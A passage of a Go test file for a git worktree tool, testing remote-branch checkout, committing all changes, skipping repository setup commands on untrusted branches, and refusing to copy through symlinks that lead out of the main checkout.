	a, _ := cloneWithOrigin(t, root, "a")
	other := filepath.Join(root, "others", "a")
	run(t, other, "git", "switch", "-q", "-c", "theirs")
	run(t, other, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "theirs")
	run(t, other, "git", "push", "-q", "origin", "theirs")
	tip := revParse(t, other, "HEAD")

	plan, err := MakePlan(filepath.Join(root, "worktrees"), "theirs", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	if mode := plan.Items[0].Mode; mode != "remote" {
		t.Fatalf("a branch only origin has is continued, mode %q", mode)
	}
	if _, err := plan.Sync(); err != nil {
		t.Fatal(err)
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	if got := revParse(t, wts[0].Path, "HEAD"); got != tip {
		t.Fatalf("worktree is at %s, not origin's theirs %s", got, tip)
	}
}

// TestCommitTakesEverything covers the commit F2 makes: changed and new
// files alike, with the message given, leaving nothing behind.
func TestCommitTakesEverything(t *testing.T) {
	root := t.TempDir()
	a, _ := cloneWithOrigin(t, root, "a")
	run(t, a.Path, "git", "config", "user.name", "t")
	run(t, a.Path, "git", "config", "user.email", "t@t")
	if err := os.WriteFile(filepath.Join(a.Path, "new.txt"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	w := Worktree{Repo: a.Path, Path: a.Path}
	files, err := Changes(w)
	if err != nil || len(files) != 1 || !strings.HasSuffix(files[0], "new.txt") {
		t.Fatalf("Changes = %q, %v", files, err)
	}
	if err := Commit(w, "Add new.txt\n\nWith a body."); err != nil {
		t.Fatal(err)
	}
	if files, _ := Changes(w); len(files) != 0 {
		t.Fatalf("left uncommitted: %q", files)
	}
	out, err := exec.Command("git", "-C", a.Path, "log", "-1", "--format=%B").Output()
	if err != nil || strings.TrimSpace(string(out)) != "Add new.txt\n\nWith a body." {
		t.Fatalf("message %q, %v", out, err)
	}
}

// setup runs the code it finds as the user: on an existing branch (an
// agent's, or a fork's pull request) it is not run, but said to be left.
func TestSetupOnlyOnTheBasesCode(t *testing.T) {
	root := t.TempDir()
	a := newRepo(t, root, "a")
	if err := os.WriteFile(filepath.Join(a.Path, RepoConfigFile), []byte("setup = \"touch ran\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	run(t, a.Path, "git", "branch", "agents")
	plan, err := MakePlan(filepath.Join(root, "worktrees"), "agents", []Repo{a})
	if err != nil {
		t.Fatal(err)
	}
	if len(plan.SetupIn()) != 0 {
		t.Fatalf("an existing branch counts as the base's: %v", plan.SetupIn())
	}
	wts, err := plan.Execute()
	if err != nil {
		t.Fatal(err)
	}
	allowed := filepath.Join(t.TempDir(), "allowed.json")
	c, _ := LoadRepoConfig(a.Path)
	if err := Allow(allowed, a.Path, c); err != nil {
		t.Fatal(err)
	}
	warnings := Prepare(wts, plan.SetupIn(), allowed, func(string) {})
	if _, err := os.Stat(filepath.Join(wts[0].Path, "ran")); err == nil {
		t.Error("setup ran on the branch's code")
	}
	if len(warnings) != 1 || !strings.Contains(warnings[0], "setup not run") {
		t.Errorf("warnings = %v", warnings)
	}
}

// A folder of the main checkout swapped for a link out of it, after the
// copy looked at it, does not lead the copy out: what is read is read in
// the main checkout.
func TestCopyReadsInTheMainCheckout(t *testing.T) {
	src, dst, outside := t.TempDir(), t.TempDir(), t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("key"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(src, "certs")); err != nil {
		t.Fatal(err)
	}
	from, err := os.OpenRoot(src)
	if err != nil {
		t.Fatal(err)
	}
	defer from.Close()
	to, err := os.OpenRoot(dst)
	if err != nil {
		t.Fatal(err)
	}
	defer to.Close()
	if err := copyTree(from, filepath.Join("certs", "secret"), to, filepath.Join("certs", "secret")); err == nil {
		t.Error("copied through a link out of the main checkout")
	}
	if _, err := os.Stat(filepath.Join(dst, "certs", "secret")); err == nil {
		t.Error("the file outside was copied")
	}
}
